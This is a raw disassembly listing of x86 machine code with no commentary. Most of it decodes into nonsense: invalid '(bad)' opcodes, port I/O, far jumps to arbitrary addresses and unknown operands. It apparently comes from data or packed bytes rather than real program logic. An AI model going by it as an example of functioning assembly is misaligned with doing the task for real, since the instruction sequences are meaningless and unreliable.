  41b25c:	int    0xac
  41b25e:	rcl    BYTE PTR [ebx+0x7b94cf98],cl
  41b264:	sti    
  41b265:	(bad)  [ecx]
  41b267:	cmp    ah,BYTE PTR ds:0x2016235d
  41b26d:	cmp    eax,0x39ee8798
  41b272:	js     0x41b28c
  41b274:	dec    edi
  41b275:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b276:	jne    0x41b22f
  41b278:	sbb    DWORD PTR [edi-0x4fdc3765],edx
  41b27e:	cdq    
  41b27f:	and    eax,0x627d753
  41b284:	dec    edi
  41b285:	rcr    dh,0xd3
  41b288:	dec    edx
  41b289:	and    BYTE PTR [eax-0x5f838790],cl
  41b28f:	cli    
  41b290:	xchg   DWORD PTR [eax+ecx*4+0x6036e38c],esi
  41b297:	push   esp
  41b298:	lds    esi,FWORD PTR [edx]
  41b29a:	fwait
  41b29b:	(bad)  
  41b29c:	cmp    ch,BYTE PTR ds:0xcc88522
  41b2a2:	mov    esi,0xf6d7b2da
  41b2a7:	fldenv ds:0x26baa7e8
  41b2ad:	or     eax,DWORD PTR [esi]
  41b2af:	fcom   st(1)
  41b2b1:	push   edx
  41b2b2:	in     al,0x8f
  41b2b4:	jmp    0x41b2be
  41b2b6:	mov    al,dl
  41b2b8:	inc    ecx
  41b2b9:	outs   dx,DWORD PTR ds:[esi]
  41b2ba:	lock mov ebp,0x3557dd0c
  41b2c0:	mov    ah,0x6e
  41b2c2:	out    dx,al
  41b2c3:	in     al,dx
  41b2c4:	not    DWORD PTR [edi-0xb01b354]
  41b2ca:	mov    eax,ds:0x92a0b808
  41b2cf:	push   ecx
  41b2d0:	test   al,0x9a
  41b2d2:	aad    0xf3
  41b2d4:	mov    ebx,0x5e84b3a1
  41b2d9:	and    eax,0x5ec12571
  41b2de:	fs test al,0x62
  41b2e1:	fst    QWORD PTR [edi+eiz*1]
  41b2e4:	sahf   
  41b2e5:	dec    ebx
  41b2e6:	xor    ch,BYTE PTR [ecx+eax*4]
  41b2e9:	cmp    bl,BYTE PTR [ecx+0x7d900f8f]
  41b2ef:	into   
  41b2f0:	mov    bh,0x35
  41b2f2:	push   es
  41b2f3:	jge    0x41b27d
  41b2f5:	push   ebx
  41b2f6:	mov    dh,0x37
  41b2f8:	mov    al,ds:0x2bd04939
  41b2fd:	jno    0x41b27f
  41b2ff:	mov    ds:0x726d8711,al
  41b304:	idiv   esp
  41b306:	xor    DWORD PTR [edx+0x63f3e7ad],edi
  41b30c:	cwde   
  41b30d:	push   0x5b
  41b30f:	retf   0x3fd7
  41b312:	ins    DWORD PTR es:[edi],dx
  41b313:	sbb    DWORD PTR [esi+ebp*8],ebx
  41b316:	cmp    ebp,DWORD PTR [ecx+0x13]
  41b319:	fmul   DWORD PTR [eax-0x26ae1bd2]
  41b31f:	repz sbb esi,esi
  41b322:	xchg   ebp,eax
  41b323:	loop   0x41b330
  41b325:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b326:	mov    al,ds:0x4dcefa62
  41b32b:	mov    ecx,0x40268d28
  41b330:	mov    esp,DWORD PTR [ebp+0x7b]
  41b333:	jge    0x41b2fb
  41b335:	mov    eax,0xca654f5f
  41b33a:	int3   
  41b33b:	call   0xaf0:0x3cdb64b4
  41b342:	inc    esi
  41b343:	addr16 mov eax,ds:0xc7b3
  41b347:	mov    cl,bh
  41b349:	mov    bh,BYTE PTR es:[ecx]
  41b34c:	sbb    bl,BYTE PTR [eax]
  41b34e:	push   ebp
  41b34f:	cmp    DWORD PTR [ecx+0x14],ecx
  41b352:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b353:	and    eax,0x489c702d
  41b358:	test   al,0xbb
  41b35a:	inc    ecx
  41b35b:	xchg   ecx,eax
  41b35c:	adc    esi,DWORD PTR [eax-0x3]
  41b35f:	add    dl,BYTE PTR [esi+eiz*4]
  41b362:	aad    0xfa
  41b364:	pop    edi
  41b365:	xor    DWORD PTR [ecx],0xb55c12f
  41b36b:	jl     0x41b3b4
  41b36d:	mov    bl,0x4b
  41b36f:	or     edi,DWORD PTR [edi-0x7fb1779f]
  41b375:	scas   al,BYTE PTR es:[edi]
  41b376:	aam    0x1e
  41b378:	repz shl BYTE PTR [ecx+0x6f],cl
  41b37c:	fist   DWORD PTR fs:0x80d503bc
  41b383:	jmp    0xccf47662
  41b388:	pushf  
  41b389:	enter  0x6d29,0xec
  41b38d:	ins    DWORD PTR es:[edi],dx
  41b38e:	push   esp
  41b38f:	cmp    eax,0xbc7beb1a
  41b394:	sbb    DWORD PTR ds:0xba4f01b0,ebp
  41b39a:	dec    ebp
  41b39b:	xchg   ebx,eax
  41b39c:	in     al,dx
  41b39d:	xor    BYTE PTR [ecx],dh
  41b39f:	ret    
  41b3a0:	xchg   ebp,eax
  41b3a1:	test   DWORD PTR [edi],eax
  41b3a3:	scas   eax,DWORD PTR es:[edi]
  41b3a4:	idiv   DWORD PTR [esi-0x2ad7f4ac]
  41b3aa:	lods   eax,DWORD PTR ds:[esi]
  41b3ab:	ret    
  41b3ac:	lods   eax,DWORD PTR ds:[esi]
  41b3ad:	bound  ecx,QWORD PTR [ecx]
  41b3af:	retf   
  41b3b0:	repz mov WORD PTR [esi+0xef86e72],gs
  41b3b7:	(bad)  
  41b3b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3ba:	pop    ecx
  41b3bb:	les    edi,FWORD PTR [edi]
  41b3bd:	cwde   
  41b3be:	out    dx,eax
  41b3bf:	inc    ebp
  41b3c0:	mov    cl,BYTE PTR [ecx+0x482aaa92]
  41b3c6:	aas    
  41b3c7:	or     dl,0xde
  41b3ca:	xchg   DWORD PTR [esp+edi*4+0x56],esi
  41b3ce:	mov    ?,WORD PTR [ecx+0x4f]
  41b3d1:	imul   edi,DWORD PTR [eax+0x468b759b],0x4c397017
  41b3db:	jo     0x41b37d
  41b3dd:	jp     0x41b440
  41b3df:	xor    ch,dl
  41b3e1:	stos   BYTE PTR es:[edi],al
  41b3e2:	fistp  DWORD PTR [ecx]
  41b3e4:	(bad)  
  41b3e6:	scas   eax,DWORD PTR es:[edi]
  41b3e7:	dec    ecx
  41b3e8:	mov    ecx,0x1b550062
  41b3ed:	fwait
  41b3ee:	(bad)  
  41b3ef:	pop    edx
  41b3f0:	dec    ebp
  41b3f1:	inc    ecx
  41b3f2:	lahf   
  41b3f3:	mov    bh,0xc6
  41b3f5:	int    0x64
  41b3f7:	push   esp
  41b3f8:	or     DWORD PTR [ebp+0x253a91b4],esp
  41b3fe:	lods   al,BYTE PTR ds:[esi]
  41b3ff:	sub    DWORD PTR [esi],ecx
  41b401:	(bad)  
  41b403:	retf   
  41b404:	es jecxz 0x41b479
  41b407:	mov    ecx,0x700d02d2
  41b40c:	cwde   
  41b40d:	inc    ebp
  41b40e:	push   edi
  41b40f:	imul   ebp,DWORD PTR [esi+edi*8],0xc3c2b65
  41b416:	jge    0x41b3a5
  41b418:	ss imul ebx,edi,0xffffffe7
  41b41c:	jmp    FWORD PTR cs:[edi-0x4fecfac9]
  41b423:	cmp    ah,BYTE PTR [ebx]
  41b425:	shr    BYTE PTR [eax-0xabeaa69],0x30
  41b42c:	cli    
  41b42d:	in     eax,0xb4
  41b42f:	add    esp,DWORD PTR [eax-0x6ea0cb48]
  41b435:	popf   
  41b436:	inc    edx
  41b437:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b438:	arpl   WORD PTR [ebx-0x36b4fa7b],bx
  41b43e:	retf   
  41b43f:	add    eax,0xe472169c
  41b444:	das    
  41b445:	sub    DWORD PTR [esi-0x7c],edi
  41b448:	fcom   DWORD PTR [eax+0x60006c72]
  41b44e:	cmp    bh,BYTE PTR [edi+eax*2-0x43]
  41b452:	ja     0x41b4b2
  41b454:	push   ebx
  41b455:	sahf   
  41b456:	out    0x7a,eax
  41b458:	arpl   sp,di
  41b45a:	(bad)  
  41b45b:	lds    esp,FWORD PTR [esi-0x28cef69c]
  41b461:	test   DWORD PTR [ecx-0x2b],0x53c44587
  41b468:	cmp    eax,DWORD PTR [ecx-0x4fd86a65]
  41b46e:	hlt    
  41b46f:	pop    ecx
  41b470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b471:	loopne 0x41b480
  41b473:	out    dx,eax
  41b474:	xor    eax,0xd597e7b3
  41b479:	lds    esi,FWORD PTR [esi]
  41b47b:	shl    DWORD PTR [ecx+0x462c52aa],1
  41b481:	in     eax,0xa6
  41b483:	jmp    0xdba8474f
  41b488:	mov    DWORD PTR [edi],eax
  41b48a:	mov    eax,0xf66f086a
  41b48f:	out    0xa4,eax
  41b491:	(bad)  [ebp-0x42]
  41b494:	jae    0x41b507
  41b496:	or     ebp,DWORD PTR [edi+0x26]
  41b499:	mov    WORD PTR [esi+0x6d16d219],?
  41b49f:	aam    0x59
  41b4a1:	mov    eax,0x537500ae
  41b4a6:	ds xor al,0xb1
  41b4a9:	(bad)  
  41b4aa:	fcmovb st,st(6)
  41b4ac:	dec    esi
  41b4ad:	repz jg 0x41b4ad
  41b4b0:	lea    ebp,[ebp-0x7927fac8]
  41b4b6:	inc    ecx
  41b4b7:	add    BYTE PTR [ebx+esi*8-0x2f8235cf],ah
  41b4be:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41b4c0:	inc    ebx
  41b4c1:	fisttp QWORD PTR [ecx-0x72c71785]
  41b4c7:	nop
  41b4c8:	ins    DWORD PTR es:[edi],dx
  41b4c9:	mov    ds:0x7266350d,al
  41b4ce:	adc    DWORD PTR [ebx],ebx
  41b4d0:	aaa    
  41b4d1:	ror    BYTE PTR [ecx*4+0x49cd3c7],1
  41b4d8:	call   0x9b7c:0x22a1c8d0
  41b4df:	pop    ebp
  41b4e0:	retf   0xd3b0
  41b4e3:	lahf   
  41b4e4:	mov    ch,0x2
  41b4e6:	shr    eax,cl
  41b4e8:	int3   
  41b4e9:	icebp  
  41b4ea:	outs   dx,BYTE PTR ds:[esi]
  41b4eb:	xchg   ebx,eax
  41b4ec:	xchg   edi,eax
  41b4ed:	es add eax,esi
  41b4f0:	inc    eax
  41b4f1:	cmp    ebx,DWORD PTR [ebx+0x5348668]
  41b4f7:	push   edx
  41b4f8:	(bad)  
  41b4f9:	xchg   edi,eax
  41b4fa:	dec    edi
  41b4fb:	jns    0x41b4dc
  41b4fd:	mov    edx,0x42a2161a
  41b502:	inc    eax
  41b503:	pop    es
  41b504:	inc    esi
  41b505:	inc    eax
  41b506:	cs jle 0x41b4a2
  41b509:	arpl   dx,cx
  41b50b:	stc    
  41b50c:	jmp    0x41b4fe
  41b50e:	mov    edx,0xa168ac19
  41b513:	mov    BYTE PTR [edi-0x2f],ch
  41b516:	je     0x41b585
  41b518:	repz cmc 
  41b51a:	cmp    BYTE PTR [edx-0x48],dl
  41b51d:	mov    dh,BYTE PTR [eax-0x11cfe821]
  41b523:	in     al,0x96
  41b525:	push   cs
  41b526:	setge  BYTE PTR [eax]
  41b529:	add    BYTE PTR [eax],ah
  41b52b:	xor    eax,eax
  41b52d:	xor    dl,BYTE PTR [esi]
  41b52f:	pushf  
  41b530:	push   esp
  41b531:	lds    edx,FWORD PTR [edx+0xe]
  41b534:	mov    DWORD PTR [ecx],esp
  41b536:	mov    eax,DWORD PTR [edx]
  41b538:	jae    0x41b5a7
  41b53a:	scas   eax,DWORD PTR es:[edi]
  41b53b:	fldcw  WORD PTR [eax-0x5e]
  41b53e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b53f:	test   DWORD PTR [edx],ebp
  41b541:	and    ecx,esi
  41b543:	and    bh,BYTE PTR [eax+edi*2+0x50e693bc]
  41b54a:	mov    DWORD PTR [edx],ebx
  41b54c:	shl    DWORD PTR [edx+0xa],cl
  41b54f:	mov    ds:0x161fc330,al
  41b554:	xchg   ebx,eax
  41b555:	test   BYTE PTR [ecx+edi*8-0x329eeacc],ah
  41b55c:	mov    ds,WORD PTR [edx+0x30a84cff]
  41b562:	xchg   DWORD PTR ds:0x9d8b0638,ebp
  41b568:	mov    di,0xfb9f
  41b56c:	xchg   ecx,eax
  41b56d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b56e:	clc    
  41b56f:	mov    eax,ds
  41b571:	lods   eax,DWORD PTR ds:[esi]
  41b572:	jmp    0x41b590
  41b574:	pop    edi
  41b575:	ss mov esi,esp
  41b578:	xchg   BYTE PTR [ebp+0x5d],dl
  41b57b:	rcr    DWORD PTR [ecx-0x27],0xc6
  41b57f:	add    BYTE PTR [esi+0x46381419],dl
  41b585:	(bad)
  41b58a:	sbb    ebx,DWORD PTR [esi+ebx*4-0x2b2ebc79]
  41b591:	and    ebp,DWORD PTR [ebp+0x67]
  41b594:	in     al,dx
  41b595:	pushf  
  41b596:	push   eax
  41b597:	add    al,0x6d
  41b599:	dec    esi
  41b59a:	sub    BYTE PTR [esi+edx*8+0x28],al
  41b59e:	popa   
  41b59f:	cdq    
  41b5a0:	fwait
  41b5a1:	pop    ecx
  41b5a2:	inc    ebx
  41b5a3:	push   ss
  41b5a4:	add    eax,0x4ecfafb5
  41b5a9:	int    0xcf
  41b5ab:	aad    0x6d
  41b5ad:	push   edi
  41b5ae:	div    BYTE PTR gs:[ecx+ecx*4-0x4b529620]
  41b5b6:	(bad)  
  41b5b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5b8:	mov    ch,0x69
  41b5ba:	(bad)  
  41b5bc:	ror    DWORD PTR ds:0x40e319e8,1
  41b5c2:	dec    ecx
  41b5c3:	out    0xf0,eax
  41b5c5:	test   DWORD PTR [edx-0x6b],edx
  41b5c8:	mov    dl,0x42
  41b5ca:	pop    es
  41b5cb:	mov    DWORD PTR [esi+ebp*1+0x81e87f0],ebx
  41b5d2:	xor    al,0xf1
  41b5d4:	in     al,dx
  41b5d5:	push   edx
  41b5d6:	into   
  41b5d7:	test   eax,0xe6d3aabb
  41b5dc:	js     0x41b585
  41b5de:	in     eax,dx
  41b5df:	pop    ebp
  41b5e0:	arpl   WORD PTR [esp+eax*4-0x2e038680],bx
  41b5e7:	xchg   edx,eax
  41b5e8:	jns    0x41b613
  41b5ea:	push   esi
  41b5eb:	jl     0x41b571
  41b5ed:	lahf   
  41b5ee:	outs   dx,DWORD PTR ds:[esi]
  41b5ef:	cmp    ch,0x57
  41b5f2:	xor    eax,0x1c573f9c
  41b5f7:	push   0xffffffb7
  41b5f9:	push   ebx
  41b5fa:	fmul   QWORD PTR [ebx]
  41b5fc:	arpl   WORD PTR [eax],sp
  41b5fe:	aaa    
  41b5ff:	aad    0xcb
  41b601:	(bad)  
  41b602:	out    dx,al
  41b603:	dec    eax
  41b604:	ins    BYTE PTR es:[edi],dx
  41b605:	push   esi
  41b606:	xchg   esi,edx
  41b608:	lods   al,BYTE PTR ds:[esi]
  41b609:	dec    ebx
  41b60a:	sar    BYTE PTR [esi-0x45],0x86
  41b60e:	push   ecx
  41b60f:	jmp    0x38f6:0x94591d2b
  41b616:	jmp    0x42a00637
  41b61b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b61c:	fwait
  41b61d:	push   edi
  41b61e:	imul   edi,DWORD PTR [ebx-0x7f],0xb37412a
  41b625:	mov    ah,0x7e
  41b627:	pop    ss
  41b628:	push   0x40c3cd87
  41b62d:	or     dh,BYTE PTR [ecx-0x2d]
  41b630:	sti    
  41b631:	or     DWORD PTR [edi-0x32],0x5
  41b635:	push   0x3d
  41b637:	mov    ah,BYTE PTR [esi]
  41b639:	mov    cl,0x66
  41b63b:	cli    
  41b63c:	add    BYTE PTR [edx+0xf07cfcc],bh
  41b642:	mov    ch,0xa3
  41b644:	imul   esi,DWORD PTR [edi],0x42cc4878
  41b64a:	sub    eax,edi
  41b64c:	data16 icebp 
  41b64e:	xor    al,0x5f
  41b650:	mov    ebx,0x4d89b324
  41b655:	inc    ecx
  41b656:	aaa    
  41b657:	aaa    
  41b658:	mov    edi,edi
  41b65a:	fcmovnb st,st(0)
  41b65c:	test   cl,ah
  41b65e:	jl     0x41b5e4
  41b660:	push   es
  41b661:	pop    ecx
  41b662:	in     eax,dx
  41b663:	mov    cl,0x67
  41b665:	or     al,0xcd
  41b667:	push   es
  41b668:	jae    0x41b6cf
  41b66a:	jmp    0x3eaf1a7
  41b66f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b670:	xor    DWORD PTR [esi-0xd3079ed],eax
  41b676:	jecxz  0x41b65d
  41b678:	in     eax,dx
  41b679:	or     DWORD PTR [edx],ebp
  41b67b:	cmc    
  41b67c:	nop
  41b67d:	jmp    0x41b6af
  41b67f:	lods   eax,DWORD PTR ds:[esi]
  41b680:	sbb    DWORD PTR [ebp+0x547afea9],eax
  41b686:	pusha  
  41b687:	jge    0x41b6ef
  41b689:	mov    BYTE PTR [eax+0x3f93c4bc],cl
  41b68f:	and    al,0xa2
  41b691:	and    al,BYTE PTR [edi+ecx*2+0x32]
  41b695:	adc    DWORD PTR [esi-0x1522c854],0xffffffa2
  41b69c:	inc    esp
  41b69d:	mov    ecx,0xe99d2413
  41b6a2:	inc    esi
  41b6a3:	mov    eax,0x7fd427cf
  41b6a8:	sub    DWORD PTR [ebx],ebp
  41b6aa:	jl     0x41b67f
  41b6ac:	arpl   WORD PTR [ecx-0x530a80e7],sp
  41b6b2:	sub    al,BYTE PTR [edx+ecx*2+0x4ca2e90f]
  41b6b9:	xor    BYTE PTR [eax],bh
  41b6bb:	mov    ecx,0x260c00d1
  41b6c0:	inc    ecx
  41b6c1:	retf   0x9045
  41b6c4:	cmp    ah,dl
  41b6c6:	pop    es
  41b6c7:	rol    BYTE PTR [edi+ebx*4+0x77],1
  41b6cb:	jne    0x41b689
  41b6cd:	arpl   WORD PTR [ebx-0x47],cx
  41b6d0:	sar    BYTE PTR [ebp-0x14],0x34
  41b6d4:	cmp    esp,ebp
  41b6d6:	push   cs
  41b6d7:	add    ebp,DWORD PTR [ebp-0x3a]
  41b6da:	repnz stos DWORD PTR es:[edi],eax
  41b6dc:	dec    edi
  41b6dd:	test   DWORD PTR [esi-0x48],esp
  41b6e0:	jns    0x41b699
  41b6e2:	or     bh,cl
  41b6e4:	xlat   BYTE PTR ds:[ebx]
  41b6e5:	test   BYTE PTR [edi-0x19b41483],cl
  41b6eb:	jg     0x41b6ec
  41b6ed:	in     eax,dx
  41b6ee:	mov    ebx,0xa9786c5f
  41b6f3:	aas    
  41b6f4:	mov    esi,0xf0b7ff22
  41b6f9:	adc    al,0xd9
  41b6fb:	dec    ecx
  41b6fc:	ja     0x41b6b4
  41b6fe:	stos   DWORD PTR es:[edi],eax
  41b6ff:	xchg   edx,eax
  41b700:	sub    BYTE PTR [ecx],bl
  41b702:	(bad)  
  41b703:	xchg   ecx,eax
  41b704:	into   
  41b705:	mov    BYTE PTR [edi+0x99dadc8],dl
  41b70b:	xchg   edx,eax
  41b70c:	arpl   WORD PTR [ebx-0x79],bx
  41b70f:	leave  
  41b710:	ds mov dl,0xf6
  41b713:	in     eax,0x91
  41b715:	pop    ecx
  41b716:	sbb    ecx,DWORD PTR [eax]
  41b718:	cmp    DWORD PTR [ecx],eax
  41b71a:	mov    ebx,0xb6507762
  41b71f:	add    dh,dh
  41b721:	out    dx,eax
  41b722:	and    al,0xdd
  41b724:	inc    edx
  41b725:	out    0xe,eax
  41b727:	lar    esp,WORD PTR [edx+0x3a]
  41b72b:	rcl    DWORD PTR [esi-0x354f71b4],1
  41b731:	inc    esi
  41b732:	imul   esi,DWORD PTR [ebx+0x4c],0xaab4b2ac
  41b739:	shl    ch,cl
  41b73b:	mov    dl,0x62
  41b73d:	ret    
  41b73e:	dec    sp
  41b740:	stos   DWORD PTR es:[edi],eax
  41b741:	repz rcr BYTE PTR [ecx+0x35],0xee
  41b746:	ret    0x584e
  41b749:	es dec ecx
  41b74b:	(bad)  
  41b74c:	out    dx,eax
  41b74d:	shr    DWORD PTR [edx],cl
  41b74f:	mov    esi,0xda522b6c
  41b754:	mov    ah,0xae
  41b756:	aas    
  41b757:	push   esp
  41b758:	or     al,0x5b
  41b75a:	inc    esi
  41b75b:	mov    ch,0xfe
  41b75d:	(bad)  
  41b75e:	in     eax,dx
  41b75f:	push   esi
  41b760:	pop    ebx
  41b761:	cld    
  41b762:	and    eax,0xa49584cd
  41b767:	xor    ecx,DWORD PTR [eax+0x7c]
  41b76a:	add    BYTE PTR [esi+0x69],cl
  41b76d:	jg     0x41b773
  41b76f:	jne    0x41b788
  41b771:	sub    DWORD PTR [ebp+0x38],0x19
  41b775:	push   edi
  41b776:	sub    al,0x11
  41b778:	jmp    0x41b745
  41b77a:	push   edi
  41b77b:	sub    esi,DWORD PTR [esp+esi*4-0x6b8b0a77]
  41b782:	das    
  41b783:	int    0x43
  41b785:	popf   
  41b786:	xor    ah,BYTE PTR [ecx]
  41b788:	mov    ch,0xc0
  41b78a:	fdiv   DWORD PTR [esi+0xc]
  41b78d:	ret    
  41b78e:	push   ebp
  41b78f:	xor    bh,dl
  41b791:	xor    BYTE PTR [ebx+0x34a4788e],cl
  41b797:	in     eax,dx
  41b798:	iret   
  41b799:	sbb    ch,BYTE PTR [eax*2+0x270564d3]
  41b7a0:	icebp  
  41b7a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7a2:	adc    eax,0xbb04fcf3
  41b7a7:	push   cs
  41b7a8:	push   edx
  41b7a9:	and    eax,0x2539c297
  41b7ae:	push   cs
  41b7af:	les    eax,FWORD PTR [ebp+0x59e4fd5e]
  41b7b5:	(bad)  
  41b7b6:	es jl  0x41b818
  41b7b9:	das    
  41b7ba:	sub    al,0xe1
  41b7bc:	sbb    eax,0x8e5583c6
  41b7c1:	loope  0x41b772
  41b7c3:	mov    ch,0x17
  41b7c5:	xchg   ebp,eax
  41b7c6:	mov    bh,0x5
  41b7c8:	lock cmc 
  41b7ca:	xor    DWORD PTR [ecx+edi*1-0x55],0x13
  41b7cf:	cdq    
  41b7d0:	cdq    
  41b7d1:	jmp    DWORD PTR [ecx-0x705ff2c2]
  41b7d7:	sbb    al,0x20
  41b7d9:	mov    bl,0xa7
  41b7db:	mov    eax,0xa0f8f345
  41b7e0:	push   esp
  41b7e1:	nop
  41b7e2:	mov    al,ds:0xdfa74666
  41b7e7:	jmp    0x41b784
  41b7e9:	xchg   ecx,eax
  41b7ea:	shr    BYTE PTR [ecx+0x78d730e6],0xfb
  41b7f1:	mov    bh,dl
  41b7f3:	aad    0x34
  41b7f5:	jo     0x41b787
  41b7f7:	fisttp QWORD PTR [ebx]
  41b7f9:	xchg   esp,eax
  41b7fa:	xor    al,0x5e
  41b7fc:	out    dx,eax
  41b7fd:	cmp    BYTE PTR ds:0xcccd01d7,ah
  41b803:	(bad)  
  41b804:	(bad)  
  41b805:	jne    0x41b7ec
  41b807:	cmp    esp,DWORD PTR [ebp-0x5f]
  41b80a:	jecxz  0x41b7ab
  41b80c:	in     eax,0x82
  41b80e:	adc    DWORD PTR [ebx],0x32de41e1
  41b814:	sub    DWORD PTR ds:0xdd78ae37,eax
  41b81a:	ror    ebp,0x52
  41b81d:	cmp    eax,0xabc471dd
  41b822:	xor    eax,0x75f3ac1b
  41b827:	jae    0x41b7bf
  41b829:	shr    BYTE PTR [ebp-0x68],0xe1
  41b82d:	mov    al,ds:0x41009b5b
  41b832:	shl    BYTE PTR [ecx],1
  41b834:	loope  0x41b829
  41b836:	mov    WORD PTR [edx-0x6681a458],gs
  41b83c:	popf   
  41b83d:	call   0x40a8316
  41b842:	std    
  41b843:	fisttp QWORD PTR [eax]
  41b845:	jmp    0x132588db
  41b84a:	dec    ebp
  41b84b:	inc    esp
  41b84c:	push   ebp
  41b84d:	test   al,0x17
  41b84f:	mov    edx,0x238ce146
  41b854:	std    
  41b855:	push   edi
  41b856:	loopne 0x41b81e
  41b858:	hlt    
  41b859:	in     al,dx
  41b85a:	add    al,ah
  41b85c:	jmp    0x41b8d4
  41b85e:	iret   
  41b85f:	xor    ah,ah
  41b861:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b862:	outs   dx,DWORD PTR ds:[esi]
  41b863:	jl     0x41b8a0
  41b865:	add    ebp,DWORD PTR [ecx-0x13]
  41b868:	icebp  
  41b869:	iret   
  41b86a:	cdq    
  41b86b:	(bad)  
  41b86c:	cld    
  41b86d:	in     eax,0x65
  41b86f:	push   es
  41b870:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41b872:	enter  0xda1e,0xb5
  41b876:	call   0xb12efdb8
  41b87b:	push   ss
  41b87c:	(bad)  
  41b87d:	shr    edx,0x28
  41b880:	in     al,dx
  41b881:	aam    0xda
  41b883:	xor    al,0xb7
  41b885:	jb     0x41b8ef
  41b887:	jmp    0x41b860
  41b889:	dec    esp
  41b88a:	(bad)  
  41b88b:	mov    esp,0xf96edb9a
  41b890:	fs dec ebx
  41b892:	jne    0x41b821
  41b894:	loope  0x41b8e1
  41b896:	push   ebx
  41b897:	(bad)  
  41b898:	out    dx,eax
  41b899:	fwait
  41b89a:	dec    eax
  41b89b:	(bad)  
  41b89c:	or     dh,BYTE PTR ds:0xc68373aa
  41b8a2:	inc    esi
  41b8a3:	adc    ah,BYTE PTR [ebp-0x2c247f51]
  41b8a9:	out    dx,eax
  41b8aa:	push   edx
  41b8ab:	retf   
  41b8ac:	lock iret 
  41b8ae:	pop    ebx
  41b8af:	js     0x41b88a
  41b8b1:	out    0xdb,eax
  41b8b3:	(bad)  
  41b8b5:	sbb    eax,0x1ec44278
  41b8ba:	dec    ecx
  41b8bb:	aas    
  41b8bc:	mov    WORD PTR [ecx+0x3e],es
  41b8bf:	sub    DWORD PTR [eax+0x274d12c2],eax
  41b8c5:	shl    BYTE PTR [edi-0x77],0x4b
  41b8c9:	daa    
  41b8ca:	(bad)  [eax-0x5a48dc8e]
  41b8d0:	inc    esi
  41b8d1:	ror    edi,cl
  41b8d3:	add    al,0x39
  41b8d5:	dec    ebp
  41b8d6:	cmc    
  41b8d7:	add    dl,cl
  41b8d9:	adc    eax,0xb50d1116
  41b8de:	repnz lea edi,gs:[ecx]
  41b8e2:	retf   0x594d
  41b8e5:	dec    eax
  41b8e6:	sbb    BYTE PTR [ecx+0x36],dl
  41b8e9:	pop    es
  41b8ea:	xor    eax,0x31aa0132
  41b8ef:	int    0x5e
  41b8f1:	aaa    
  41b8f2:	mov    WORD PTR [ecx],es
  41b8f4:	ret    
  41b8f5:	push   esp
  41b8f6:	popa   
  41b8f7:	cmp    esi,esp
  41b8f9:	daa    
  41b8fa:	mov    fs,edi
  41b8fc:	rcl    BYTE PTR [esi],0x54
  41b8ff:	lea    eax,[edx+0x45]
  41b902:	mov    esp,0x6b5b3ea5
  41b907:	dec    edx
  41b908:	fwait
  41b909:	sbb    eax,0x67fda4e0
  41b90e:	test   DWORD PTR ds:[esi-0x67],ecx
  41b912:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b913:	push   es
  41b914:	adc    dh,BYTE PTR [eax]
  41b916:	test   BYTE PTR [ecx],0x96
  41b919:	in     eax,0x3b
  41b91b:	hlt    
  41b91c:	in     al,0x70
  41b91e:	dec    edx
  41b91f:	lahf   
  41b920:	xor    ch,al
  41b922:	push   edx
  41b923:	xor    eax,edx
  41b925:	lods   al,BYTE PTR ds:[esi]
  41b926:	or     ah,BYTE PTR [edx-0x4e]
  41b929:	ins    DWORD PTR es:[edi],dx
  41b92a:	std    
  41b92b:	or     ebx,DWORD PTR [ecx+0x7096d650]
  41b931:	add    DWORD PTR [ebx-0x796add56],esp
  41b937:	dec    ebx
  41b938:	and    al,0xba
  41b93a:	call   0x477c:0xaca2f25e
  41b941:	xlat   BYTE PTR ds:[ebx]
  41b942:	(bad)  
  41b943:	ja     0x41b954
  41b945:	cmp    dh,ah
  41b947:	inc    edi
  41b948:	push   esp
  41b949:	(bad)  
  41b94a:	in     eax,dx
  41b94b:	lods   eax,DWORD PTR ds:[esi]
  41b94c:	(bad)  
  41b94d:	not    BYTE PTR [eax]
  41b94f:	sbb    dh,dh
  41b951:	(bad)  
  41b953:	sbb    al,0x4f
  41b955:	cmc    
  41b956:	test   DWORD PTR [ebx],eax
  41b958:	mov    ebp,0xdc48b685
  41b95d:	sar    eax,1
  41b95f:	mov    WORD PTR [edx-0x5b],es
  41b962:	ret    
  41b963:	mov    esp,0x4165fad7
  41b968:	xor    cl,BYTE PTR [ebp+ecx*8-0x6bc25ca7]
  41b96f:	jo     0x41b9ea
  41b971:	test   eax,0x25b1ac6a
  41b976:	mov    ch,0x88
  41b978:	stos   DWORD PTR es:[edi],eax
  41b979:	shl    edi,1
  41b97b:	add    eax,0x479c971d
  41b980:	sti    
  41b981:	(bad)  
  41b982:	jnp    0x41b98c
  41b984:	mov    ?,WORD PTR [bx]
  41b987:	daa    
  41b988:	stos   DWORD PTR es:[edi],eax
  41b989:	das    
  41b98a:	or     bl,ch
  41b98c:	aam    0x4e
  41b98e:	inc    edi
  41b98f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b990:	popf   
  41b991:	xor    ebx,DWORD PTR [ebx-0xac0dad3]
  41b997:	mov    esi,0x92a92efe
  41b99c:	aas    
  41b99d:	dec    ecx
  41b99e:	repnz pop es
  41b9a0:	bswap  eax
  41b9a2:	push   cs
  41b9a3:	push   0x2d
  41b9a5:	jmp    0x2cfa2c03
  41b9aa:	stc    
  41b9ab:	mov    ds:0x74bebea0,eax
  41b9b0:	and    DWORD PTR [ecx+ebp*2+0x6e],eax
  41b9b4:	fsubp  st(0),st
  41b9b6:	adc    ecx,esi
  41b9b8:	test   BYTE PTR [ecx],dl
  41b9ba:	repnz xchg ebp,eax
